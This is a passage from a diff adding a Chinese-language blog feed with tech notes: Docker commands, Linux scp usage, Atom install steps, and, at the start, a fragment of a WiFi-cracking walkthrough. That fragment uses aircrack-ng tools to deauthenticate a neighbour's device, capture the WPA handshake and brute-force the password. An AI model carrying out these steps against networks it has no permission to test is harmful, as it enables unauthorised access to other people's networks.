+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看有哪些网卡</span></span><br><span class="line">$ iwconfig</span><br><span class="line"><span class="comment"># 启动网卡的监听模式 </span></span><br><span class="line">$ sudo airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>扫描周围无线WIFI</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo airodump-ng mon0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>专门监听老王的WIFI(老王和路由器的数据传输)</p>
+</li>
+<li>发起攻击,模拟WIFI路由器单播,向老王发出断开链接的请求<br>sudo aireplay-ng -0 1 -a C0:61:18:89:F8:8A -h 74:E5:0B:80:E4:60 mon0</li>
+<li>老王的电脑断开链接,自动重新建立链接,捕获4次握手包</li>
+<li>4次握手包里包含加密的密码,SHA1,MD5</li>
+<li>暴力破解,穷举字典破解<br>aircrack-ng -w password linuxcpp-01.ivs</li>
+</ol>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="安装Wireshark">安装Wireshark</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span ]]>
+    </summary>
+    
+      <category term="network" scheme="http://gwpost.github.com/categories/network/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Docker学习]]></title>
+    <link href="http://gwpost.github.com/2015/11/11/docker/docker-2015-11-11/"/>
+    <id>http://gwpost.github.com/2015/11/11/docker/docker-2015-11-11/</id>
+    <published>2015-11-11T11:45:33.000Z</published>
+    <updated>2016-04-16T08:14:11.127Z</updated>
+    <content type="html"><![CDATA[<h1 id="Docker命令">Docker命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">sudo docker info</span><br><span class="line">sudo status docker</span><br><span class="line">sudo start docker</span><br><span class="line">sudo  stop docker</span><br><span class="line">sudo docker run -i -t ubuntu /bin/bash --name containername</span><br><span class="line">hostname</span><br><span class="line">cat /etc/hosts</span><br><span class="line">ip a</span><br><span class="line">ps -aux</span><br><span class="line">sudo docker ps <span class="operator">-a</span></span><br><span class="line">sudo docker ps</span><br><span class="line"> sudo docker ps <span class="operator">-l</span></span><br><span class="line"> sudo docker start  containername</span><br><span class="line"> sudo docker attach containername</span><br><span class="line">sudo docker run --name containername</span><br><span class="line">sudo docker run --name containername -w /var/<span class="built_in">log</span></span><br><span class="line">sudo docker run  -P container_port --name containername</span><br><span class="line">sudo docker run --name containername <span class="operator">-d</span>  -p host_port:container_port ubuntu /bin/sh -c <span class="string">"while true; do echo hello world;sleep 1;done"</span></span><br><span class="line">sudo docker logs containername</span><br><span class="line">sudo docker logs -ft containername</span><br><span class="line">sudo docker top containername</span><br><span class="line">sudo docker stop containername</span><br><span class="line">sudo docker ps -n <span class="number">3</span></span><br><span class="line">sudo docker inspect containername</span><br><span class="line">sudo docker inspect --format <span class="string">'&#123;&#123;.name&#125;&#125; &#123;&#123;.State.Running&#125;&#125;'</span>  containername</span><br><span class="line">/var/lib/docker</span><br><span class="line">sudo docker rm containername</span><br><span class="line">sudo docker rm `docker ps -aq`</span><br><span class="line">sudo docker images</span><br><span class="line">sudo docker pull  containername</span><br><span class="line">sudo docker pull  containername:<span class="number">20</span></span><br><span class="line">sudo docker images  containername</span><br><span class="line">sudo docker search containername</span><br><span class="line">sudo docker commit origincontainername newcontainername:tagname -m=<span class="string">"commit msg"</span> --author=<span class="string">"authorname"</span></span><br><span class="line">sudo docker build -t=<span class="string">"containername:tagname"</span> .</span><br><span class="line">sudo docker build --no-cache -t=<span class="string">"containername"</span></span><br><span class="line">ENV REFRESHED_AT <span class="number">2015</span>-<span class="number">11</span>-<span class="number">26</span></span><br><span class="line">sudo docker <span class="built_in">history</span> containername</span><br><span class="line">sudo docker port containername container_port</span><br><span class="line">sudo docker push username/containername</span><br><span class="line">sudo docker rmi  containername</span><br><span class="line">sudo docker rmi `docker ps -aq`</span><br><span class="line">ip a show docker0</span><br><span class="line">/var/lib/docker/volumes</span><br><span class="line">sudo docker inspect <span class="operator">-f</span> <span class="string">"&#123;&#123;.Volumes&#125;&#125;"</span>  containername</span><br><span class="line">sudo docker run <span class="operator">-d</span> -P --volumes-from  containernamefrom  containername</span><br><span class="line">sudo docker run <span class="operator">-d</span> --volumes-from containername</span><br><span class="line"></span><br><span class="line">sudo docker run -v /usr/<span class="built_in">local</span>/bin:/target jpetazzo/nsenter</span><br><span class="line">sudo nsenter --target <span class="number">17469</span> --mount --uts --ipc --net --pid</span><br><span class="line"></span><br><span class="line">sudo fig up <span class="operator">-d</span></span><br><span class="line">sudo fig ps</span><br><span class="line">sudo fig logs</span><br><span class="line">sudo fig stop</span><br><span class="line">sudo fig start</span><br><span class="line">sudo fig rm</span><br><span class="line"></span><br><span class="line">sudo docker -H  remoteIp:port info</span><br></pre></td></tr></table></figure>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="Docker命令">Docker命令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class=]]>
+    </summary>
+    
+      <category term="docker" scheme="http://gwpost.github.com/categories/docker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Linux实用命令]]></title>
+    <link href="http://gwpost.github.com/2015/11/10/linux/linux-2015-11-10/"/>
+    <id>http://gwpost.github.com/2015/11/10/linux/linux-2015-11-10/</id>
+    <published>2015-11-10T14:21:09.000Z</published>
+    <updated>2016-01-15T06:59:47.875Z</updated>
+    <content type="html"><![CDATA[<ol>
+<li><p>查看Linux系统位数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname <span class="operator">-a</span></span><br><span class="line">uname -m</span><br><span class="line">uname -m</span><br><span class="line">file  /sbin/init </span><br><span class="line">arch</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>跨机文件或目录的复制</p>
+</li>
+</ol>
+<ul>
+<li><p>从本地复制到远程-复制文件  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp <span class="built_in">local</span>_file remote_username@remote_ip:remote_folder   复制到remote_folder文件夹下</span><br><span class="line">scp <span class="built_in">local</span>_file remote_username@remote_ip:remote_folder/remote_file  文件重命名</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从本地复制到远程-复制目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r <span class="built_in">local</span>_folder remote_username@remote_ip:remote_folder   复制到remote_folder文件夹下</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从远程复制到本地-复制文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp remote_username@remote_ip:remote_folder/remote_file  <span class="built_in">local</span>_file   在本地当前路径创建<span class="built_in">local</span>_file</span><br><span class="line">scp remote_username@remote_ip:remote_folder/remote_file  <span class="built_in">local</span>_folder  复制到<span class="built_in">local</span>_folder文件夹下</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从远程复制到本地-复制目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp  -r  remote_username@remote_ip:remote_folder <span class="built_in">local</span>_folder   复制到<span class="built_in">local</span>_folder文件夹下</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="Ubuntu安装Atom">Ubuntu安装Atom</h1><p>sudo add-apt-repository ppa:webupd8team/atom<br>sudo apt-get update<br>sudo apt-get install atom</p>
+<h1 id="Ubuntu卸载Atom">Ubuntu卸载Atom</h1><p>sudo apt-get remove atom<br>sudo add-apt-repository –remove ppa:webupd8team/atom</p>
+<p>以上只会卸载该软件，要卸载附加的一些软件包，请使用以下命令卸载多余的软件包：<br>sudo apt-get autoremove</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<ol>
+<li><p>查看Linux系统位数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="li]]>
+    </summary>
+    
+      <category term="linux" scheme="http://gwpost.github.com/categories/linux/"/>
+    
+  </entry>
+  
+</feed>
